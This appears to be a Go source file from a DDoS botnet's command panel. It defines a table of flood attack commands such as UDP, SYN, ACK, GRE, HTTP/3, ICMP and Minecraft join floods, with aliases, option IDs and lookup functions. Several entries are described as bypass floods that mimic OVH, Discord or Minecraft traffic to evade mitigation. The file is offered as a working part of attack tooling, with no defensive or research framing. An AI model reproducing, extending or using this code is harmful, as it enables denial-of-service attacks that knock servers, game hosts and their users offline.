package flood

var (
	Limiter = NewFloodLimiter()

	Methods = map[string]*Method{
		"!udpplain": {
			ID:          0,
			Name:        "udpplain",
			Aliases:     []string{"!plainudp", "!udp", "udp", "udpplain", "!udphex", "udphex", "hex", "!hex"},
			Description: "UDP socket flood",
			Options:     []uint8{0, 1, 6, 7, 27, 28, 29, 30, 31, 32, 33, 34, 45},
		},
		"!udpbypass": {
			ID:          14,
			Name:        "udpbypass",
			Aliases:     []string{"udpbypass", "!udpbypass", "udp-bypass"},
			Description: "UDP socket flood",
			Options:     []uint8{0, 1, 6, 7, 27, 28, 29, 30, 31, 32, 33, 34, 35, 45},
		},
		"!vse": {
			ID:          26,
			Name:        "vse",
			Aliases:     []string{"vse", "!vse", "valvesource"},
			Description: "Valve Source Engine query flood",
			Options:     []uint8{6, 7, 30, 32, 33, 34, 45},
		},
		"!tcpbypass": {
			ID:          2,
			Name:        "tcpbypass",
			Description: "TCP IP flood",
			Aliases:     []string{"tcpbypass"},
			Options:     []uint8{0, 7, 27, 28, 29, 32, 33, 34, 45},
		},
		"!ack": {
			ID:          4,
			Name:        "ack",
			Description: "TCP ACK flood",
			Aliases:     []string{"!tcpack", "ack", "ackflood", "!ackflood"},
			Options:     []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 27, 28, 32, 33, 34, 45},
		},
		"!socket": {
			ID:          6,
			Name:        "socket",
			Description: "TCP socket flood with lots of options",
			Aliases:     []string{"!tcpsocket", "socket", "!socketflood", "socketflood"},
			Options:     []uint8{0, 1, 7, 27, 28, 30, 31, 32, 33, 29, 34, 45},
		},
		"!sockethold": {
			ID:          7,
			Name:        "sockethold",
			Description: "TCP socket flood designed to max out available sockets",
			Aliases:     []string{"!tcpsockethold", "sockethold"},
			Options:     []uint8{7, 32, 33, 34, 45},
		},
		"!greip": {
			ID:          10,
			Name:        "greip",
			Aliases:     []string{"greip", "!greflood", "!gre", "gre", "greflood"},
			Description: "Layer 3 GRE IP flood",
			Options:     []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25, 27, 28, 32, 33, 34, 45},
		},
		"!stomp": {
			ID:          11,
			Name:        "stomp",
			Description: "TCP handshake + ACK/PSH flood",
			Aliases:     []string{"!tcpstomp", "stompflood", "stomp", "!stompflood", "tcpstomp"},
			Options:     []uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16, 27, 28, 32, 33, 34, 45},
		},
		"!handshake": {
			ID:          12,
			Name:        "handshake",
			Description: "TCP 3-way handshake flood",
			Aliases:     []string{"!tcphandshake", "!oack", "!ovh", "handshake"},
			Options:     []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 27, 28, 30, 31, 32, 33, 34, 45},
		},
		"!std": {
			ID:          13,
			Name:        "std",
			Description: "Standard socket flood",
			Aliases:     []string{"!standard", "std"},
			Options:     []uint8{0, 1, 7, 27, 28, 32, 33, 34, 45},
		},
		"!rawudp": {
			ID:          1,
			Name:        "rawudp",
			Aliases:     []string{"!udpraw", "udpraw", "raw", "!raw"},
			Description: "yes",
			Options:     []uint8{2, 3, 4, 0, 1, 5, 6, 7, 25, 32, 33, 34, 45},
		},
		"!syn": {
			ID:          3,
			Name:        "syn",
			Description: "TCP SYN flood",
			Aliases:     []string{"!tcpsyn", "syn", "tcpsyn"},
			Options:     []uint8{2, 3, 4, 5, 6, 7, 25, 32, 33, 34, 45},
		},
		"!syndata": {
			ID:          5,
			Name:        "syndata",
			Aliases:     []string{"!tcpsyndata", "syndata", "synflood", "!synflood"},
			Description: "TCP SYN flood with payload",
			Options:     []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 27, 28, 29, 32, 33, 34, 45},
		},
		"!tfo": {
			ID:          8,
			Name:        "tfo",
			Description: "TCP Fast Open flood",
			Aliases:     []string{"tfo", "!fastopen"},
			Options:     []uint8{2, 3, 4, 5, 6, 7, 25, 32, 33, 34, 45},
		},
		"!wra": {
			ID:          9,
			Name:        "wra",
			Aliases:     []string{"wra", "tcpwra", "!tcpwra"},
			Description: "yes",
			Options:     []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 27, 28, 32, 33, 34, 45},
		},
		"!stompbig": {
			ID:          17,
			Name:        "stompbig",
			Description: "Advanced TCP bypass flood based on 100upv15",
			Aliases:     []string{"!stompbig", "stompbig"},
			Options:     []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 27, 28, 32, 33, 34, 35, 37, 38, 39, 40, 45},
		},
		"!greack": {
			ID:          21,
			Name:        "greack",
			Description: "GRE-encapsulated TCP ACK flood",
			Aliases:     []string{"!greack", "greack"},
			Options:     []uint8{0, 7, 30, 32, 33, 34, 45},
		},
		"!shand": {
			ID:          24,
			Name:        "shand",
			Description: "Handshake by LORIKAZ TCP flood",
			Aliases:     []string{"!shand", "shand"},
			Options:     []uint8{0, 7, 30, 32, 33, 34, 45}, // payload size, dport, repeat, sleep, threads, minpps, maxpps
		},
		"!ovhudp": {
			ID:          22,
			Name:        "ovhudp",
			Description: "Specialized UDP flood with Discord mimicry and PPS limiting",
			Aliases:     []string{"!ovhudp", "ovhudp"},
			Options:     []uint8{0, 7, 30, 32, 33, 34, 45}, // payload size, dport, repeat, minpps, maxpps, sleep, threads
		},
		"!discord": {
			ID:          23,
			Name:        "discord",
			Description: "Dedicated Discord protocol flood with specialized payload",
			Aliases:     []string{"!discord", "discord"},
			Options:     []uint8{7, 30, 32, 33, 34, 45}, // dport, repeat, minpps, maxpps, sleep
		},
		"!ovhtcp": {
			ID:          25,
			Name:        "ovhtcp",
			Description: "Legitimate TCP socket OVH payload mimic flood",
			Aliases:     []string{"!ovhtcp", "ovhtcp", "tcpovh"},
			Options:     []uint8{0, 7, 30, 32, 33, 34, 45}, // payload size, dport, repeat, sleep, threads, minpps, maxpps
		},
		"!http": {
			ID:          27,
			Name:        "http",
			Description: "HTTP flood",
			Aliases:     []string{"!http", "http"},
			Options:     []uint8{42, 43, 41, 0, 32, 33, 34, 45, 7}, // host, method, path, sockets, minpps, maxpps, sleep, threads, dport
		},
		"!https": {
			ID:          28,
			Name:        "https",
			Description: "HTTPS flood",
			Aliases:     []string{"!https", "https"},
			Options:     []uint8{42, 43, 41, 0, 32, 33, 34, 45, 7}, // host, method, path, sockets, minpps, maxpps, sleep, threads, dport
		},
		"!http3": {
			ID:          35,
			Name:        "http3",
			Description: "HTTP/3 (QUIC) flood using WolfSSL & ngtcp2",
			Aliases:     []string{"!http3", "http3", "quic"},
			Options:     []uint8{42, 43, 41, 0, 32, 33, 34, 45, 7}, // host, method, path, sockets, minpps, maxpps, sleep, threads, dport
		},
		"!mccps": {
			ID:          29,
			Name:        "mccps",
			Description: "Minecraft CPS flood",
			Aliases:     []string{"mccps", "!mccps"},
			Options:     []uint8{7, 46, 47, 48, 32, 33, 34, 45}, // dport, conns, domain, pvn, minpps, maxpps, sleep, threads
		},
		"!mcping": {
			ID:          30,
			Name:        "mcping",
			Description: "Minecraft Ping flood",
			Aliases:     []string{"mcping", "!mcping"},
			Options:     []uint8{7, 46, 32, 33, 34, 45}, // dport, conns, minpps, maxpps, sleep, threads
		},
		"!mchand": {
			ID:          31,
			Name:        "mchand",
			Description: "Minecraft Handshake flood",
			Aliases:     []string{"mchand", "!mchand", "mchandshake"},
			Options:     []uint8{7, 46, 47, 48, 32, 33, 34, 45}, // dport, conns, domain, pvn, minpps, maxpps, sleep, threads
		},
		"!mcjoin": {
			ID:          32,
			Name:        "mcjoin",
			Description: "Minecraft Join flood",
			Aliases:     []string{"mcjoin", "!mcjoin"},
			Options:     []uint8{7, 46, 47, 48, 32, 33, 34, 45}, // dport, conns, domain, pvn, minpps, maxpps, sleep, threads
		},
		"!ackbypass": {
			ID:          33,
			Name:        "ackbypass",
			Description: "Kernel level TCP connect + RAW ACK flood",
			Aliases:     []string{"ackbypass", "!ackbypass"},
			Options:     []uint8{0, 7, 30, 32, 33, 34, 45}, // len, dport, repeat, minpps, maxpps, sleep, threads
		},
		"!icmp": {
			ID:          34,
			Name:        "icmp",
			Description: "ICMP echo request flood",
			Aliases:     []string{"icmp", "!icmp", "ping", "!ping"},
			Options:     []uint8{0, 1, 2, 3, 4, 5, 25, 30, 32, 33, 34, 45}, // len, rand, tos, id, ttl, df, source, repeat, minpps, maxpps, sleep, threads
		},
	}
)

func Clone() []*Method {
	var lol []*Method
	for _, method := range Methods {
		lol = append(lol, method)
	}

	return lol
}

func Get(name string) *Method {
	for key, method := range Methods {
		if key == name {
			return method
		}

		for _, alias := range method.Aliases {
			if alias == name {
				return method
			}
		}
	}

	return nil
}
